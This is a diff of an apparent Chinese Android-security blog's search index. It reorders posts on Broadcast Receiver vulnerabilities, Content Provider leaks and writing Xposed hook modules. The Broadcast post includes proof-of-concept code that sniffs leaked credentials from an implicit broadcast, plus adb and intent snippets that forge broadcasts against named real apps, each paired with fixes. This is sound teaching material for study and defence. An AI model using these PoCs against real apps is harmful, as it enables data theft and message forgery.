@@ -3098,107 +3098,6 @@ http://localhost:4000/admin
       </tags>
   </entry>
   <entry>
-    <title>android Broadcast Receiver漏洞挖掘</title>
-    <url>/post/962818054.html</url>
-    <content><![CDATA[<h2 id="Broadcast-Receiver安全场景和危害"><a href="#Broadcast-Receiver安全场景和危害" class="headerlink" title="Broadcast Receiver安全场景和危害"></a>Broadcast Receiver安全场景和危害</h2><p>BroadcastReceiver是Android的四大组件之一，这个组件涉及两个概念：广播发送者和广播接受者。<br>这里的广播实际上指的就是intent。<br>当发送一个广播时，系统会将发送的广播(intent)与系统中所有注册的符合条件的接收者的IntentFilter进行匹配，若匹配成功，则执行相应接收者的onReceive函数。<br>发送广播时如果处理不当，恶意应用便可以嗅探、拦截广播，致使敏感数据泄露等；如果接收广播时处理不当，便可导致拒绝服务攻击、伪造消息、越权操作等。  </p>
-<h2 id="Broadcast-Receiver漏洞分类"><a href="#Broadcast-Receiver漏洞分类" class="headerlink" title="Broadcast Receiver漏洞分类"></a>Broadcast Receiver漏洞分类</h2><ul>
-<li>敏感信息泄露</li>
-<li>权限绕过</li>
-<li>消息伪造</li>
-<li>拒绝服务</li>
-</ul>
-<h2 id="敏感信息泄漏漏洞"><a href="#敏感信息泄漏漏洞" class="headerlink" title="敏感信息泄漏漏洞"></a>敏感信息泄漏漏洞</h2><p>发送的intent没有明确指定接收者，而是简单的通过action进行匹配。恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播里存在敏感数据，就被恶意应用窃取了。  </p>
-<p>隐式意图发送敏感信息：  </p>
-<pre><code>private void d() {
-    Intent v1 = new Intent();
-    v1.setAction(&quot;com.sample.action.server_running&quot;);
-    v1.putExtra(&quot;local_ip&quot;,v0.h);
-    v1.putExtra(&quot;port&quot;,v0.i);
-    v1.putExtra(&quot;code&quot;,v0.g);
-    v1.putExtra(&quot;connected&quot;,v0.s);
-    v1.putExtra(&quot;pwd_predefined&quot;,v0.r);
-    if(!TextUtils.isEmpty(v0.t)){
-        v1.putExtra(&quot;connected_usr&quot;,v0.t);
-    }
-    sendBroadcast(v1);
-}
-</code></pre><p>POC:  </p>
-<pre><code>public void onReceive(Context context,Intent intent){
-    String s = null;
-    if(intent.getACtion().equals(&quot;com.sample.action.server_running&quot;)){
-        String pwd=intent.getStringExtra(&quot;connected&quot;);
-        s=&quot;Airdroid =&gt; [&quot;+pwd+&quot;]/&quot;+intent.getExtras();
-    }
-    Toast.makeTest(context,String.format(&quot;%sReceived&quot;,s),Toast.LENGTH_SHORT).show();
-}
-</code></pre><h2 id="敏感信息泄露漏洞：修复"><a href="#敏感信息泄露漏洞：修复" class="headerlink" title="敏感信息泄露漏洞：修复"></a>敏感信息泄露漏洞：修复</h2><p>修复后代码，使用LocalBroadcastManager.sendBroadcast()发出的广播只能被app自身广播接收器接收。  </p>
-<pre><code>Intent intent = new Intent(&quot;my-sensitive-event&quot;);
-intent.putExtra(&quot;event&quot;,&quot;this is a test event&quot;);
-LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
-</code></pre><h2 id="权限绕过漏洞"><a href="#权限绕过漏洞" class="headerlink" title="权限绕过漏洞"></a>权限绕过漏洞</h2><p>可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册。另外一种是通过Context.registerReceiver()动态注册,指定相应的intentFilter参数。然而动态注册的广播默认是导出的。如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等。  </receiver></p>
-<p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的。  </p>
-<p>code：  </p>
-<pre><code>android.intent.action.PACKAGE_FULLY_REMOVED
-</code></pre><p>漏洞证明：  </p>
-<pre><code>简单测试方法用adb shell 发送广播
-</code></pre><p>code区域：  </p>
-<pre><code>am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d package:com.wumii.android.mimi
-</code></pre><h2 id="权限绕过漏洞：修复"><a href="#权限绕过漏洞：修复" class="headerlink" title="权限绕过漏洞：修复"></a>权限绕过漏洞：修复</h2><p>推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势。  </p>
-<p>1.不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。<br>2.不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。<br>3.它比系统的全局广播更高效。  </p>
-<h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输的，被调用的Receiver接收有可能产生安全隐患。  
-
-Intent i= new Intent();
-i.setAction(&quot;com.baidu.android.oushservice.action.MESSAGE&quot;);
-Bundle b = new Bundle();
-JSONObject jsobject = new JSONObject();
-JSONObject custom_content_js = new JSONObject();
-jsobject.put(&quot;title&quot;,&quot;百度云盘【漏洞你中奖了!】&quot;);
-
-jsobject.put(&quot;descrption&quot;,&quot;&quot;);
-
-//jsobject.put(&quot;url&quot;,&quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);
-JSONObject customcontent_js = new JSONObject();
-customcontent_js.put(&quot;type&quot;,&quot;1&quot;);
-customcontent_js.put(&quot;msg_type&quot;,&quot;resources_push&quot;);
-</code></pre><h2 id="消息伪造-防护"><a href="#消息伪造-防护" class="headerlink" title="消息伪造 防护"></a>消息伪造 防护</h2><pre><code>设置为签名验证
-android:protectionLevel=&quot;signature&quot;
-
-&lt;receiver android:name=&quot;com.umeng.message.UmengMessageBootReceiver&quot; android:protectionLevel=&quot;signature&quot;&gt;
-    &lt;intent-filter&gt;
-        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
-    &lt;/intent-filter&gt;
-&lt;/receiver&gt;
-</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。  </p>
-<p>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。  </p>
-<h2 id="拒绝服务-防护"><a href="#拒绝服务-防护" class="headerlink" title="拒绝服务 防护"></a>拒绝服务 防护</h2><ul>
-<li>空指针异常</li>
-<li>类型转换异常</li>
-<li>数组越界访问异常</li>
-<li>类未定义异常</li>
-<li><p>其他异常</p>
-<p>  //Serializable：<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){</p>
-<pre><code>  i.getSerializableExtra(&quot;serializable_key&quot;);//未做异常判断
-</code></pre><p>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
-</li>
-</ul>
-<p>谨慎处理接收的intent以及其携带的信息。<br>对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  </p>
-<h2 id="Broadcast安全防护"><a href="#Broadcast安全防护" class="headerlink" title="Broadcast安全防护"></a>Broadcast安全防护</h2><ul>
-<li>私有广播接收器设置exported=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</li>
-<li>对接收来的广播进行验证。</li>
-<li>内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</li>
-<li>返回结果时需注意接收app是否会泄露信息。 </li>
-<li>发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</li>
-<li>使用LocalBroadcastManager。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>android安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android Content Provider漏洞挖掘</title>
     <url>/post/758430476.html</url>
     <content><![CDATA[<h2 id="Content-Provider安全场景和危害"><a href="#Content-Provider安全场景和危害" class="headerlink" title="Content Provider安全场景和危害"></a>Content Provider安全场景和危害</h2><p>在Android系统中，Content Provider作为应用程序四大组件之一，它起到在应用程序之间共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现。<br>然而有些数据是应用自己的核心数据，需要有保护地进行开放。<br>虽然Binder进程间通信机制突破了以应用程序为边界的权限控制，但是它是安全可控的，因为数据的访问接口是由数据的所有者来提供的，就是数据提供方可以在接口层来实现安全控制，决定哪些数据是可以读，哪些数据可以写。<br>很多开发者不能恰当的使用，导致攻击者可访问到应用本身不想共享的数据。虽然Content Provider组件本身也提供了读写权限控制，但是它的控制粒度是比较粗的。  </p>
@@ -3319,6 +3218,107 @@ public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws Fil
     return ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);
 }
 </code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/29/01.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android Broadcast Receiver漏洞挖掘</title>
+    <url>/post/962818054.html</url>
+    <content><![CDATA[<h2 id="Broadcast-Receiver安全场景和危害"><a href="#Broadcast-Receiver安全场景和危害" class="headerlink" title="Broadcast Receiver安全场景和危害"></a>Broadcast Receiver安全场景和危害</h2><p>BroadcastReceiver是Android的四大组件之一，这个组件涉及两个概念：广播发送者和广播接受者。<br>这里的广播实际上指的就是intent。<br>当发送一个广播时，系统会将发送的广播(intent)与系统中所有注册的符合条件的接收者的IntentFilter进行匹配，若匹配成功，则执行相应接收者的onReceive函数。<br>发送广播时如果处理不当，恶意应用便可以嗅探、拦截广播，致使敏感数据泄露等；如果接收广播时处理不当，便可导致拒绝服务攻击、伪造消息、越权操作等。  </p>
+<h2 id="Broadcast-Receiver漏洞分类"><a href="#Broadcast-Receiver漏洞分类" class="headerlink" title="Broadcast Receiver漏洞分类"></a>Broadcast Receiver漏洞分类</h2><ul>
+<li>敏感信息泄露</li>
+<li>权限绕过</li>
+<li>消息伪造</li>
+<li>拒绝服务</li>
+</ul>
+<h2 id="敏感信息泄漏漏洞"><a href="#敏感信息泄漏漏洞" class="headerlink" title="敏感信息泄漏漏洞"></a>敏感信息泄漏漏洞</h2><p>发送的intent没有明确指定接收者，而是简单的通过action进行匹配。恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播里存在敏感数据，就被恶意应用窃取了。  </p>
+<p>隐式意图发送敏感信息：  </p>
+<pre><code>private void d() {
+    Intent v1 = new Intent();
+    v1.setAction(&quot;com.sample.action.server_running&quot;);
+    v1.putExtra(&quot;local_ip&quot;,v0.h);
+    v1.putExtra(&quot;port&quot;,v0.i);
+    v1.putExtra(&quot;code&quot;,v0.g);
+    v1.putExtra(&quot;connected&quot;,v0.s);
+    v1.putExtra(&quot;pwd_predefined&quot;,v0.r);
+    if(!TextUtils.isEmpty(v0.t)){
+        v1.putExtra(&quot;connected_usr&quot;,v0.t);
+    }
+    sendBroadcast(v1);
+}
+</code></pre><p>POC:  </p>
+<pre><code>public void onReceive(Context context,Intent intent){
+    String s = null;
+    if(intent.getACtion().equals(&quot;com.sample.action.server_running&quot;)){
+        String pwd=intent.getStringExtra(&quot;connected&quot;);
+        s=&quot;Airdroid =&gt; [&quot;+pwd+&quot;]/&quot;+intent.getExtras();
+    }
+    Toast.makeTest(context,String.format(&quot;%sReceived&quot;,s),Toast.LENGTH_SHORT).show();
+}
+</code></pre><h2 id="敏感信息泄露漏洞：修复"><a href="#敏感信息泄露漏洞：修复" class="headerlink" title="敏感信息泄露漏洞：修复"></a>敏感信息泄露漏洞：修复</h2><p>修复后代码，使用LocalBroadcastManager.sendBroadcast()发出的广播只能被app自身广播接收器接收。  </p>
+<pre><code>Intent intent = new Intent(&quot;my-sensitive-event&quot;);
+intent.putExtra(&quot;event&quot;,&quot;this is a test event&quot;);
+LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
+</code></pre><h2 id="权限绕过漏洞"><a href="#权限绕过漏洞" class="headerlink" title="权限绕过漏洞"></a>权限绕过漏洞</h2><p>可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册。另外一种是通过Context.registerReceiver()动态注册,指定相应的intentFilter参数。然而动态注册的广播默认是导出的。如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等。  </receiver></p>
+<p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的。  </p>
+<p>code：  </p>
+<pre><code>android.intent.action.PACKAGE_FULLY_REMOVED
+</code></pre><p>漏洞证明：  </p>
+<pre><code>简单测试方法用adb shell 发送广播
+</code></pre><p>code区域：  </p>
+<pre><code>am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d package:com.wumii.android.mimi
+</code></pre><h2 id="权限绕过漏洞：修复"><a href="#权限绕过漏洞：修复" class="headerlink" title="权限绕过漏洞：修复"></a>权限绕过漏洞：修复</h2><p>推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势。  </p>
+<p>1.不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。<br>2.不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。<br>3.它比系统的全局广播更高效。  </p>
+<h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输的，被调用的Receiver接收有可能产生安全隐患。  
+
+Intent i= new Intent();
+i.setAction(&quot;com.baidu.android.oushservice.action.MESSAGE&quot;);
+Bundle b = new Bundle();
+JSONObject jsobject = new JSONObject();
+JSONObject custom_content_js = new JSONObject();
+jsobject.put(&quot;title&quot;,&quot;百度云盘【漏洞你中奖了!】&quot;);
+
+jsobject.put(&quot;descrption&quot;,&quot;&quot;);
+
+//jsobject.put(&quot;url&quot;,&quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);
+JSONObject customcontent_js = new JSONObject();
+customcontent_js.put(&quot;type&quot;,&quot;1&quot;);
+customcontent_js.put(&quot;msg_type&quot;,&quot;resources_push&quot;);
+</code></pre><h2 id="消息伪造-防护"><a href="#消息伪造-防护" class="headerlink" title="消息伪造 防护"></a>消息伪造 防护</h2><pre><code>设置为签名验证
+android:protectionLevel=&quot;signature&quot;
+
+&lt;receiver android:name=&quot;com.umeng.message.UmengMessageBootReceiver&quot; android:protectionLevel=&quot;signature&quot;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。  </p>
+<p>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。  </p>
+<h2 id="拒绝服务-防护"><a href="#拒绝服务-防护" class="headerlink" title="拒绝服务 防护"></a>拒绝服务 防护</h2><ul>
+<li>空指针异常</li>
+<li>类型转换异常</li>
+<li>数组越界访问异常</li>
+<li>类未定义异常</li>
+<li><p>其他异常</p>
+<p>  //Serializable：<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){</p>
+<pre><code>  i.getSerializableExtra(&quot;serializable_key&quot;);//未做异常判断
+</code></pre><p>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
+</li>
+</ul>
+<p>谨慎处理接收的intent以及其携带的信息。<br>对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  </p>
+<h2 id="Broadcast安全防护"><a href="#Broadcast安全防护" class="headerlink" title="Broadcast安全防护"></a>Broadcast安全防护</h2><ul>
+<li>私有广播接收器设置exported=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</li>
+<li>对接收来的广播进行验证。</li>
+<li>内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</li>
+<li>返回结果时需注意接收app是否会泄露信息。 </li>
+<li>发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</li>
+<li>使用LocalBroadcastManager。</li>
+</ul>
 ]]></content>
       <categories>
         <category>android安全</category>
@@ -3751,111 +3751,6 @@ mount: Permission denied</code>这个问题就新开一个命令行窗口执行<
       </tags>
   </entry>
   <entry>
-    <title>android VitualXposed 模块编写</title>
-    <url>/post/4010998048.html</url>
-    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
-<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
-<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
-adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
-adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
-adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
-</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
-<p>build.gradle中添加  </p>
-<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
-compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
-</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
-<pre><code>&lt;application&gt;
-    &lt;meta-data
-        android:name=&quot;xposedmodule&quot;
-        android:value=&quot;true&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposeddescription&quot;
-        android:value=&quot;this is a xposed demo&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposedminversion&quot;
-        android:value=&quot;30&quot; /&gt;
-&lt;/application&gt;
-</code></pre><p>3.新建个项目为被hook  </p>
-<p>MainActivity.java  </p>
-<pre><code>public class MainActivity extends AppCompatActivity {
-
-    private Button btn;
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        btn = findViewById(R.id.btn);
-        btn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-    public String toastMessage() {
-        return &quot;我没有被劫持&quot;;
-    }
-}
-</code></pre><p>activity_main.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
-    android:layout_width=&quot;match_parent&quot;
-    android:layout_height=&quot;match_parent&quot;
-    tools:context=&quot;.MainActivity&quot;&gt;
-    &lt;Button
-        android:id=&quot;@+id/btn&quot;
-        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
-        app:layout_constraintTop_toTopOf=&quot;parent&quot;
-        android:layout_width=&quot;wrap_content&quot;
-        android:layout_height=&quot;wrap_content&quot;
-        android:text=&quot;btn&quot;/&gt;
-
-&lt;/android.support.constraint.ConstraintLayout&gt;
-
-</code></pre><p>打包安装到VirtualXposed  </p>
-<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
-<pre><code>public class HookToast implements IXposedHookLoadPackage {
-    @Override
-    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
-        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
-            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
-            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
-                @Override
-                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
-//                    super.beforeHookedMethod(param);
-                    XposedBridge.log(&quot;you are been hooked&quot;); 
-                }
-
-                @Override
-                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
-//                    super.afterHookedMethod(param);
-                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
-                }
-            });
-        }
-    }
-}
-</code></pre><pre><code>新建app/assets文件夹
-新建xposed_init文件
-添加
-com.demo.android_hook.HookToast //修改成你的hook类
-
-然后打包测试
-</code></pre><p>app/assets/xposed_init  </p>
-<pre><code>com.demo.android_hook.HookToast
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
-        <tag>xposed</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>smali hello</title>
     <url>/post/229799766.html</url>
     <content><![CDATA[<h2 id="条件跳转分支"><a href="#条件跳转分支" class="headerlink" title="条件跳转分支"></a>条件跳转分支</h2><pre><code>条件跳转分支：
@@ -4084,6 +3979,111 @@ Hello World
       <tags>
         <tag>android逆向</tag>
         <tag>smali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android VitualXposed 模块编写</title>
+    <url>/post/4010998048.html</url>
+    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
+<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
+<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
+adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
+adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
+adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
+</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
+<p>build.gradle中添加  </p>
+<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
+compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
+</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
+<pre><code>&lt;application&gt;
+    &lt;meta-data
+        android:name=&quot;xposedmodule&quot;
+        android:value=&quot;true&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposeddescription&quot;
+        android:value=&quot;this is a xposed demo&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposedminversion&quot;
+        android:value=&quot;30&quot; /&gt;
+&lt;/application&gt;
+</code></pre><p>3.新建个项目为被hook  </p>
+<p>MainActivity.java  </p>
+<pre><code>public class MainActivity extends AppCompatActivity {
+
+    private Button btn;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        btn = findViewById(R.id.btn);
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+    public String toastMessage() {
+        return &quot;我没有被劫持&quot;;
+    }
+}
+</code></pre><p>activity_main.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    tools:context=&quot;.MainActivity&quot;&gt;
+    &lt;Button
+        android:id=&quot;@+id/btn&quot;
+        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:text=&quot;btn&quot;/&gt;
+
+&lt;/android.support.constraint.ConstraintLayout&gt;
+
+</code></pre><p>打包安装到VirtualXposed  </p>
+<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
+<pre><code>public class HookToast implements IXposedHookLoadPackage {
+    @Override
+    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
+        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
+            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
+            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
+//                    super.beforeHookedMethod(param);
+                    XposedBridge.log(&quot;you are been hooked&quot;); 
+                }
+
+                @Override
+                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
+//                    super.afterHookedMethod(param);
+                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
+                }
+            });
+        }
+    }
+}
+</code></pre><pre><code>新建app/assets文件夹
+新建xposed_init文件
+添加
+com.demo.android_hook.HookToast //修改成你的hook类
+
+然后打包测试
+</code></pre><p>app/assets/xposed_init  </p>
+<pre><code>com.demo.android_hook.HookToast
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
